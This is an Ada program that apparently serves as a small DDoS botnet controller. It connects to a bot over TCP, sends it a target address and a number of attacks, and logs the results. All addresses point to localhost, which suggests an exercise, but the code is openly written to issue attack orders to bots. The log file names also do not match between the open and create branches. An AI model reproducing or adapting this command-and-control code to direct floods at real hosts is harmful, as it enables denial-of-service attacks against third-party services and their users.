with Ada.Text_IO; use Ada.Text_IO;
with GNAT.Sockets; use GNAT.Sockets;
with Ada.Exceptions; use Ada.Exceptions;

procedure main is

	address: Sock_Addr_Type;
	client: Socket_Type;
	channel: Stream_Access;
	targetURI : String := "";
	isSuccessful : boolean;
        Utfil : File_Type;

	procedure initiate_connection (botAddress: in String; portNumber: in Port_Type) is
	begin
		GNAT.Sockets.Initialize;
		Create_Socket (client);
		address.Addr := Inet_Addr(botAddress);
		address.Port := portNumber;

		Connect_Socket (client, address);
		channel := Stream (client);

	end initiate_connection;

	procedure close_connection is
	begin
		Close_Socket (client);
	end close_connection;

	function check_bot_connection (botAddress: in String) return boolean is
	begin
		initiate_connection(botAddress, 2345);
		close_connection;
		return true;
		exception
			when SOCKET_ERROR =>
				return false;
	end check_bot_connection;


	procedure attack_order (botAddress, targetURI: in String; numberOfAttacks: in integer) is
	begin
		initiate_connection(botAddress, 2346);
		String'Write(channel, targetURI);
		String'Write(channel, Integer'Image(numberOfAttacks));
		close_connection;
	end attack_order;


begin

	begin
		Open(Utfil, Append_File, "ddos_logs.txt");
	Exception
		when Name_Error => 	
			Create(Utfil, Out_File, "ddos_log.txt");
	end;
	Put_Line(Utfil, "Started");
	Put_Line(Utfil, "Looking for botnets...");
	isSuccessful := check_bot_connection("127.0.0.1");
	if(isSuccessful) then
		Put_Line(Utfil, "Connected to botnets! Sending attack request!");
		attack_order("127.0.0.1", "127.0.0.1:8080", 3);
		put_line(Utfil, "Attack is successful");
	else
		put_line(Utfil, "No botnets found");
	end if;
	Close(Utfil);


end main;
